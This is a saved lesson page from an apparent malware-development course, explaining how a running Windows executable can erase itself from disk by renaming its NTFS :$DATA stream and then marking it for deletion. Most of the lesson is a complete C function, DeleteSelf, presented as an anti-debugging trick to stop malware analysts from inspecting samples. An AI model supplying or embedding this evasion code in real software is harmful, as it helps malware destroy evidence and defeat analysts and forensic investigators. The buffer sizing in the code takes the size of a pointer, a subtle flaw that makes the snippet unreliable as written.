<!DOCTYPE html>
<html class="dark"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta http-equiv="X-UA-Compatible" content="ie-edge">
        <meta name="csrf-token" content="YwmJrjvrFLFoheCqdySsfQHrDWEGzxTLXO7qfost">
        <link rel="stylesheet" href="Anti-Debugging%20-%20Self-Deletion_files/template.css">
        <link rel="shortcut icon" href="https://maldevacademy.com/favicon.ico">
        <!-- fontawesome for icons -->
        <link rel="stylesheet" href="Anti-Debugging%20-%20Self-Deletion_files/font-awesome.min.css">
        <!-- google fonts -->
        <link rel="preconnect" href="https://fonts.gstatic.com/">
        <link href="Anti-Debugging%20-%20Self-Deletion_files/css2.css" rel="stylesheet">
        <link href="Anti-Debugging%20-%20Self-Deletion_files/css2_002.css" rel="stylesheet">
        <title>Anti-Debugging - Self-Deletion</title>
        <!-- Custom css files, order matters -->
        <link rel="preload" as="style" href="Anti-Debugging%20-%20Self-Deletion_files/app.fdbb573b.css"><link rel="stylesheet" href="Anti-Debugging%20-%20Self-Deletion_files/app.fdbb573b.css"><link rel="stylesheet" href="Anti-Debugging%20-%20Self-Deletion_files/viewer.css">
    </head>
    <body>
        <nav id="navbar" class="px-2 sm:px-4 py-2.5 bg-gray-900 sticky hidden">
    <div class="container flex flex-wrap justify-between mx-auto">
      <a data-target="_self" href="https://maldevacademy.com/" class="flex items-center">
        <div class="main-logo flex flex-row items-center">
            <span class="text-xl logo-font text-white">MALDEV</span>
            <img class="w-[25px] mx-2 relative bottom-1" src="Anti-Debugging%20-%20Self-Deletion_files/logo-bug-2.png" alt="Logo">   
            <span class="text-xl logo-font text-white">ACADEMY</span>          
        </div>
      </a>
      <button data-collapse-toggle="navbar-default" id="navbar-phone-btn" type="button" class="inline-flex items-center p-2 ml-3 text-sm text-gray-500 rounded-lg md:hidden hover:bg-gray-100 focus:outline-none focus:ring-2 focus:ring-gray-200 dark:text-gray-400 dark:hover:bg-gray-700 dark:focus:ring-gray-600" aria-controls="navbar-default" aria-expanded="false">
        <span class="sr-only">Open main menu</span>
        <svg class="w-6 h-6" aria-hidden="true" fill="currentColor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" d="M3 5a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 10a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 15a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1z" clip-rule="evenodd"></path></svg>
      </button>
      <div class="hidden w-full md:block md:w-auto" id="navbar-default">
        <ul class="flex flex-col items-center p-4 mt-4 bg-gray-50 rounded-lg border border-gray-100 md:flex-row md:space-x-8 md:mt-0 md:text-sm md:font-medium md:border-0 md:bg-white dark:bg-gray-800 md:dark:bg-gray-900 dark:border-gray-700">
          <li>
            <a data-target="_self" href="https://maldevacademy.com/" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Home</a>
          </li>
          <li>
            <a data-target="_self" href="https://maldevacademy.com/faq" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">FAQ</a>
          </li>
          <li>
            <a data-target="_self" href="https://maldevacademy.com/syllabus" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Syllabus</a>
          </li>
                              <li>
            <a data-target="_self" href="https://maldevacademy.com/pricing" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Pricing</a>
          </li>
                                        <li>
            <a data-target="_self" href="https://maldevacademy.com/profile" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Profile</a>
          </li>
          <li>
            <form action="https://maldevacademy.com/logout" method="POST">
            <input type="hidden" name="_token" value="YwmJrjvrFLFoheCqdySsfQHrDWEGzxTLXO7qfost">              <button type="submit" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Logout</button>
            </form>
          </li>
          <li class="mt-4 md:mt-0">
            <a data-target="_self" href="https://maldevacademy.com/modules" class="text-white bg-blue-700 hover:bg-blue-800 font-medium rounded-lg text-sm px-5 py-2.5 text-center md:mr-3 mr-0 dark:bg-blue-600 dark:hover:bg-blue-700 dark:focus:ring-blue-800">Modules</a>
          </li>
                  </ul>
      </div>
    </div>
  </nav>        <div class="bg-gray-900 p-4">
    <div class="flex">
        <div class="md:flex-row flex-col flex md:items-center w-1/2 bg-gray-700 border-l border-t border-gray-600 pl-4 pt-2 pb-2 rounded-tl">
            <div>
                Module 72 - Anti-Debugging - Self-Deletion
            </div>
            <div class="ml-2 w-4 h-4 bg-orange-600 rounded-full"></div>
        </div>
        <div class="flex justify-end items-center w-1/2 bg-gray-700 pr-4 pt-2 pb-2 rounded-tr border-t border-r border-gray-600">
            <div class="enlarge-container pr-4">
                <img src="Anti-Debugging%20-%20Self-Deletion_files/enlarge.svg" onclick="toggleScreenWidth()" class="hover:bg-gray-600 rounded-sm cursor-pointer" id="enlargeToggle" alt="Screen Width" width="20px">
            </div>
            <div class="objectives-container pr-4">
                <img src="Anti-Debugging%20-%20Self-Deletion_files/objectives.svg" onclick="toggleObjectives()" class="hover:bg-gray-600 cursor-pointer" id="objectivesToggle" alt="Objectives" width="20px">
            </div>
            <div class="terminal-container  pr-4 ">
                <img src="Anti-Debugging%20-%20Self-Deletion_files/ide.svg" onclick="toggleIde()" class="hover:bg-gray-600 rounded-sm cursor-pointer" id="terminalToggle" alt="Terminal" width="22px">
            </div>
                                    <div class="dl-container">
                <a href="https://maldevacademy.com/download/file/SelfDeletion" target="_blank">
                    <img src="Anti-Debugging%20-%20Self-Deletion_files/dl.svg" class="hover:bg-gray-600 rounded-full cursor-pointer" alt="Download" width="20px">
                </a>
            </div>
                                </div>
    </div>
    <div id="height-container" class="flex h-full min-h-[800px]">
        <div class="flex max-w-full min-w-full">
            <div id="description-container" class="viewer code-description h-full bg-gray-800 p-4 border-r border-l border-b border-gray-600 px-5 md:px-10 lg:px-20 w-full"><div class="toastui-editor-contents" style="overflow-wrap: break-word;">
            <h2>Anti-Debugging - Self-Deletion</h2>
<h3>Introduction</h3>
<p>During the previous module, multiple techniques were discussed to 
obstruct researchers and malware analysts from inspecting the malware 
and prevent them from understanding the functionality or creating 
signatures. This module will cover an advanced anti-debugging technique 
that works by making the malware to self-delete.</p>
<h3>The NTFS file system</h3>
<p>Before diving into self-deletion, it's important to understand how 
New Technology File System (NTFS) works. NTFS is a proprietary file 
system implemented as the primary file system for the Windows operating 
system. It surpasses its predecessors, FAT and exFAT, by offering 
features such as file and folder permissions, compression, encryption, 
hard links, symbolic links, and transactional operations. NTFS also 
offers enhanced reliability, performance, and scalability.</p>
<p>NTFS file system also supports <a href="https://owasp.org/www-community/attacks/Windows_alternate_data_stream" target="_blank">alternate data streams</a>. Files in NTFS file systems can have multiple streams of data in addition to the default stream, <code>:$DATA</code>. <code>:$DATA</code> exists for every file, providing an alternative means of accessing them.</p>
<h3>Deleting A Running Binary</h3>
<p>It is not possible to delete the current running process's binary on 
Windows since deleting a file normally requires that no other process is
 using it. The image below shows an unsuccessful attempt to delete the 
"Release" folder while having a file opened within that folder open.</p>
<p><img src="Anti-Debugging%20-%20Self-Deletion_files/self-deletion-115320077-5c34dcbb-2e0e-461d-b8e5-a1b34d72b139.png" alt="image"></p>
<p>Another example is shown using the <a href="https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-deletefilea" target="_blank">DeleteFile</a> WinAPI which deletes an existing file. The <code>DeleteFile</code> WinAPI fails with an <code>ERROR_ACCESS_DENIED</code> error.</p>
<p><img src="Anti-Debugging%20-%20Self-Deletion_files/self-deletion-215320748-1964cf44-c332-443a-9f52-465aa7ffe9be.png" alt="image"></p>
<p>One way to get around this is by renaming the default data stream <code>:$DATA</code>
 to another random name that represents a new data stream. After that, 
deleting the newly renamed data stream will result in the binary being 
erased from the disk, even while it's still running.</p>
<h3>Retrieve File Handle</h3>
<p>The first step of the process is to retrieve a handle of the target 
file, which is the local implementation's file. The file handle can be 
retrieved using the <code>CreateFile</code> WinAPI. The <a href="https://learn.microsoft.com/en-us/windows/win32/secauthz/access-mask" target="_blank">access flag</a> must be set to <code>DELETE</code> to provide file deletion permissions.</p>
<h3>Renaming The Data Stream</h3>
<p>The next step to delete a running binary file is to rename the <code>:$DATA</code> data stream. This can be achieved by using the <a href="https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-setfileinformationbyhandle" target="_blank">SetFileInformationByHandle</a> WinAPI with the <code>FileRenameInfo</code> flag.</p>
<p>The <code>SetFileInformationByHandle</code> WinAPI function is shown below.</p>
<pre><code>BOOL SetFileInformationByHandle(
  [in] HANDLE                    hFile,                       // Handle to the file for which to change information.
  [in] FILE_INFO_BY_HANDLE_CLASS FileInformationClass,        // Flag value that specifies the type of information to be changed
  [in] LPVOID                    lpFileInformation,           // Pointer to the buffer that contains the information to change for 
  [in] DWORD                     dwBufferSize                 // The size of 'lpFileInformation' buffer in bytes
);
</code></pre>
<p>The <code>FileInformationClass</code> parameter should be a <a href="https://learn.microsoft.com/en-us/windows/win32/api/minwinbase/ne-minwinbase-file_info_by_handle_class" target="_blank">FILE_INFO_BY_HANDLE_CLASS</a> enumeration value.</p>
<p>When the <code>FileInformationClass</code> parameter is set to <code>FileRenameInfo</code>, then <code>lpFileInformation</code> must be a pointer to the <a href="https://learn.microsoft.com/en-us/windows/win32/api/winbase/ns-winbase-file_rename_info" target="_blank">FILE_RENAME_INFO</a> structure, this is mentioned by Microsoft as shown in the following image</p>
<p><img src="Anti-Debugging%20-%20Self-Deletion_files/self-deletion-522060452-81349155-d24a-4b8a-b84c-fa231dfcbf3b.png" alt="image"></p>
<h3>FILE_RENAME_INFO Structure</h3>
<p>The <code>FILE_RENAME_INFO</code> structure is shown below.</p>
<pre><code>typedef struct _FILE_RENAME_INFO {
  union {
    BOOLEAN ReplaceIfExists;
    DWORD   Flags;
  } DUMMYUNIONNAME;
  BOOLEAN ReplaceIfExists;
  HANDLE  RootDirectory;
  DWORD   FileNameLength;   // The size of 'FileName' in bytes
  WCHAR   FileName[1];      // The new name
} FILE_RENAME_INFO, *PFILE_RENAME_INFO;
</code></pre>
<p>The two members that need to be set are <code>FileNameLength</code> and <code>FileName</code>.  Microsoft's documentation explains how to define a new NTFS file stream name.</p>
<p><img src="Anti-Debugging%20-%20Self-Deletion_files/self-deletion-315324185-4157dabc-fe41-4a40-b1ce-caf4c3a19c1f.png" alt="image"></p>
<p>Therefore, <code>FileName</code> should be a wide-character string that starts with a colon (<code>:</code>).</p>
<h3>Deleting The Data Stream</h3>
<p>The last step is to delete the <code>:$DATA</code> stream to erase the file from the disk. To do so, the same <code>SetFileInformationByHandle</code> WinAPI will be used, with a different flag, <code>FileDispositionInfo</code>. This flag marks the file for deletion when its handle is closed. This is the flag Microsoft uses in the <a href="https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-setfileinformationbyhandle#examples" target="_blank">example section</a>.</p>
<p>When the <code>FileDispositionInfo</code> flag is used,  <code>lpFileInformation</code> must be a pointer to the <a href="https://learn.microsoft.com/en-us/windows/win32/api/winbase/ns-winbase-file_disposition_info" target="_blank">FILE_DISPOSITION_INFO</a> structure, this is mentioned by Microsoft as shown in the following image</p>
<p><img src="Anti-Debugging%20-%20Self-Deletion_files/self-deletion-6222060992-0b642d05-e871-4ed1-b2f0-a634796ea28.png" alt="image"></p>
<p>The <code>FILE_DISPOSITION_INFO</code> structure is shown below.</p>
<pre><code>typedef struct _FILE_DISPOSITION_INFO {
  BOOLEAN DeleteFile;       // Set to 'TRUE' to mark the file for deletion
} FILE_DISPOSITION_INFO, *PFILE_DISPOSITION_INFO;
</code></pre>
<p>The <code>DeleteFile</code> member must simply be set to <code>TRUE</code> to delete the file.</p>
<h3>Refreshing File Data Stream</h3>
<p>After calling <code>SetFileInformationByHandle</code> for the first time to rename the file's NTFS file stream, the file handle should be closed and re-opened with another <code>CreateFile</code> call. This is done to refresh the file data stream so that the new handle contains the new data stream.</p>
<h3>Self-Deletion Final Code</h3>
<p>The <code>DeleteSelf</code> function shown below uses the described process to delete a file from the disk while it's running.</p>
<p>Everything in the code snippet below has been previously explained except for the <a href="https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulefilenamew" target="_blank">GetModuleFileNameW</a>
 WinAPI. This function is used to retrieve the path for the file that 
contains the specified module. If the first parameter is set to <code>NULL</code> (as in the code snippet below), then it retrieves the path of the executable file for the <em>current process</em>.</p>
<pre><code>
// The new data stream name
#define NEW_STREAM L":Maldev"


BOOL DeleteSelf() {


	WCHAR                       szPath [MAX_PATH * 2] = { 0 };
	FILE_DISPOSITION_INFO       Delete                = { 0 };
	HANDLE                      hFile                 = INVALID_HANDLE_VALUE;
	PFILE_RENAME_INFO           pRename               = NULL;
	const wchar_t*              NewStream             = (const wchar_t*)NEW_STREAM;
	SIZE_T                      sRename               = sizeof(FILE_RENAME_INFO) + sizeof(NewStream);


    // Allocating enough buffer for the 'FILE_RENAME_INFO' structure
	pRename = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sRename);
	if (!pRename) {
		printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
  
    // Cleaning up some structures
	ZeroMemory(szPath, sizeof(szPath));
	ZeroMemory(&amp;Delete, sizeof(FILE_DISPOSITION_INFO));

	//----------------------------------------------------------------------------------------
    // Marking the file for deletion (used in the 2nd SetFileInformationByHandle call) 
	Delete.DeleteFile = TRUE;
  
    // Setting the new data stream name buffer and size in the 'FILE_RENAME_INFO' structure
	pRename-&gt;FileNameLength = sizeof(NewStream);
	RtlCopyMemory(pRename-&gt;FileName, NewStream, sizeof(NewStream));

	//----------------------------------------------------------------------------------------

    // Used to get the current file name
	if (GetModuleFileNameW(NULL, szPath, MAX_PATH * 2) == 0) {
		printf("[!] GetModuleFileNameW Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	//----------------------------------------------------------------------------------------
    // RENAMING
  
    // Opening a handle to the current file
	hFile = CreateFileW(szPath, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		printf("[!] CreateFileW [R] Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	wprintf(L"[i] Renaming :$DATA to %s  ...", NEW_STREAM);

    // Renaming the data stream
	if (!SetFileInformationByHandle(hFile, FileRenameInfo, pRename, sRename)) {
		printf("[!] SetFileInformationByHandle [R] Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	wprintf(L"[+] DONE \n");

	CloseHandle(hFile);

	//----------------------------------------------------------------------------------------
    // DELEING
  
    // Opening a new handle to the current file
	hFile = CreateFileW(szPath, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		printf("[!] CreateFileW [D] Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	wprintf(L"[i] DELETING ...");
	
    // Marking for deletion after the file's handle is closed
	if (!SetFileInformationByHandle(hFile, FileDispositionInfo, &amp;Delete, sizeof(Delete))) {
		printf("[!] SetFileInformationByHandle [D] Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	wprintf(L"[+] DONE \n");

	CloseHandle(hFile);

	//----------------------------------------------------------------------------------------

    // Freeing the allocated buffer
	HeapFree(GetProcessHeap(), 0, pRename);

	return TRUE;
}

</code></pre>
<h3>Demo</h3>
<p>The image below shows the <code>SelfDeletion.exe</code> process running although the binary file was erased from disk.</p>
<p><img src="Anti-Debugging%20-%20Self-Deletion_files/self-deletion-415326977-a40ef9d4-4c54-4c0b-b02c-c3396e24a221.png" alt="image"></p>

            </div></div>
            <div id="accessory-container" class="hidden flex flex-col w-1/4 min-w-1/4 h-full">
                <div id="objectives" class="hidden p-4 border-r border-b bg-gray-900 border-gray-600 font-code w-full h-1/2">
                    <div class="w-full bg-gray-700 text-center mb-4 font-sans text-lg">Objectives</div>
                                                                        
                                                                        
            <div class="flex items-center mb-2 font-sans">
                                <input type="checkbox" id="objective-0" data-objective-id="0" class="flex-none w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300 focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                                <label class="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300">Read about and understand the NTFS file system</label>
                            </div>
                                                                        
                                                                        
                    <div class="flex items-center mb-2 font-sans">
                                <input type="checkbox" id="objective-1" data-objective-id="1" class="flex-none w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300 focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                                <label class="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300">Understand how to rename/delete a data stream via the SetFileInformationByHandle WinAPI function</label>
                            </div>
                                                                                  
                </div>
                <div id="ide" class="hidden p-4 border-r border-b border-gray-600 font-code w-full h-1/2">
                    <textarea class="bg-gray-900 outline-0 w-full h-full resize-none font-sans" placeholder="Write temporary notes or code here"></textarea>
                </div>
            </div>  
        </div>
      </div>
      <div class="flex">
        <div class="flex flex-row flex-wrap justify-center items-center w-full bg-gray-700 border-r border-l border-gray-600 pl-4 pt-2 pb-2 rounded-bl rounded-br">
                        <div class="mr-2">
                <a data-target="_self" href="https://maldevacademy.com/modules/71"><button class="w-[100px] h-10 px-5 text-sm duration-150 text-white bg-blue-700 hover:bg-blue-800 rounded-lg focus:shadow-outline">Previous</button></a>           
            </div>
                        <div class="mr-2">
                <a data-target="_self" href="https://maldevacademy.com/modules"><button class="w-[100px] h-10 px-5 text-sm duration-150 text-white bg-blue-700 hover:bg-blue-800 rounded-lg focus:shadow-outline">Modules</button></a>           
            </div>
            <div class="my-2 mr-2">
            <form id="complete-module" action="https://maldevacademy.com/modules/72/complete" method="POST">
                <input type="hidden" name="_token" value="YwmJrjvrFLFoheCqdySsfQHrDWEGzxTLXO7qfost">                <button id="complete-btn" class="w-[100px] h-10 px-5 text-white text-sm duration-150 bg-green-700 rounded-lg focus:shadow-outline hover:bg-green-800 ">Complete</button>
            </form>
            <form id="uncomplete-module" action="https://maldevacademy.com/modules/72/progress" method="POST">
                <input type="hidden" name="_token" value="YwmJrjvrFLFoheCqdySsfQHrDWEGzxTLXO7qfost">                <button id="uncomplete-btn" class="w-[100px] h-10 px-5 text-white text-sm duration-150 bg-red-700 rounded-lg focus:shadow-outline hover:bg-red-800 hidden">Undo</button>
            </form>
            </div>
                                    <div class="mr-2">
                <a data-target="_self" href="https://maldevacademy.com/modules/73"><button class="w-[100px] h-10 px-5 text-sm duration-150 text-white bg-blue-700 hover:bg-blue-800 rounded-lg focus:shadow-outline">Next</button></a>           
            </div>
                    </div>
    </div>
</div>

<footer id="footer" class="text-gray-400 border-t-[1px] border-gray-700 bg-gray-900 body-font hidden">
    <div class="container px-5 py-8 mx-auto flex items-center sm:flex-row flex-col">
      <p class="text-sm text-gray-400 sm:ml-4 sm:pl-4 sm:border-gray-800 sm:py-2 sm:mt-0 mt-4">© 2023 MalDev Academy</p>
        <a href="https://twitter.com/maldevacademy" target="_blank" class="text-gray-500 hover:text-white ml-2">
            <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 24 24" aria-hidden="true"><path d="M8.29 20.251c7.547 0 11.675-6.253 11.675-11.675 0-.178 0-.355-.012-.53A8.348 8.348 0 0022 5.92a8.19 8.19 0 01-2.357.646 4.118 4.118 0 001.804-2.27 8.224 8.224 0 01-2.605.996 4.107 4.107 0 00-6.993 3.743 11.65 11.65 0 01-8.457-4.287 4.106 4.106 0 001.27 5.477A4.072 4.072 0 012.8 9.713v.052a4.105 4.105 0 003.292 4.022 4.095 4.095 0 01-1.853.07 4.108 4.108 0 003.834 2.85A8.233 8.233 0 012 18.407a11.616 11.616 0 006.29 1.84"></path></svg>
        </a>
      <span class="inline-flex sm:ml-auto sm:mt-0 mt-4 justify-center sm:justify-start">
        <a class="text-gray-400 text-sm" href="https://maldevacademy.com/tos" target="_blank">
          Terms and Conditions
      </a></span><a class="text-gray-400 text-sm" href="https://maldevacademy.com/tos" target="_blank">
    </a></div><a class="text-gray-400 text-sm" href="https://maldevacademy.com/tos" target="_blank">
  </a></footer><a class="text-gray-400 text-sm" href="https://maldevacademy.com/tos" target="_blank">        

        <script src="Anti-Debugging%20-%20Self-Deletion_files/jquery-3.6.0.min.js"></script>
        <script src="Anti-Debugging%20-%20Self-Deletion_files/bootstrap.min.js"></script>
        <link rel="preload" as="style" href="Anti-Debugging%20-%20Self-Deletion_files/app.4474f4d1.css"><link rel="modulepreload" href="Anti-Debugging%20-%20Self-Deletion_files/app.5f3af5ce.js"><link rel="stylesheet" href="Anti-Debugging%20-%20Self-Deletion_files/app.4474f4d1.css"><script type="module" src="Anti-Debugging%20-%20Self-Deletion_files/app.5f3af5ce.js"></script><script src="Anti-Debugging%20-%20Self-Deletion_files/navbar.js"></script>
<script src="Anti-Debugging%20-%20Self-Deletion_files/moduleviewer.js"></script>

 
<script>
$(document).ready(function() {
    $('a:not([data-target="_self"])').attr('target', '_blank');

    $('input[type=checkbox]').change(function() {
    var checked = $(this).is(':checked');
    var userId = 260;
    var moduleId = 72;
    var objectiveId = $(this).data('objective-id');
    $.ajax({
        url: checked ? "https://maldevacademy.com/complete/objective" : "https://maldevacademy.com/remove/objective",
        type: "POST",
        data: {
        _token: "YwmJrjvrFLFoheCqdySsfQHrDWEGzxTLXO7qfost",
        user_id: userId,
        module_id: moduleId,
        objective_id: objectiveId
        },
        success: function(response) {

        },
        error: function(xhr) {
        console.log('Error');
        }
    });
    });

    $('#complete-module').submit(function(event) {
    event.preventDefault(); // Prevent default form submission

    var form = $(this);
    var url = form.attr('action');
    var data = form.serialize();
    var completeBtn = form.find('#complete-btn');
    var uncompleteBtn = $('#uncomplete-btn');

    $.ajax({
        type: 'POST',
        url: url,
        data: data,
        success: function(response) {
            completeBtn.addClass('hidden');
            uncompleteBtn.removeClass('hidden');
        },
        error: function(xhr) {
            console.log('Error');
        }
    });
});

$('#uncomplete-module').submit(function(event) {
    event.preventDefault(); // Prevent default form submission

    var form = $(this);
    var url = form.attr('action');
    var data = form.serialize();
    var completeBtn = $('#complete-btn');
    var uncompleteBtn = form.find('#uncomplete-btn');

    $.ajax({
        type: 'POST',
        url: url,
        data: data,
        success: function(response) {
            uncompleteBtn.addClass('hidden');
            completeBtn.removeClass('hidden');
        },
        error: function(xhr) {
            console.log('Error');
        }
    });
});
});
</script>
    
</a></body></html>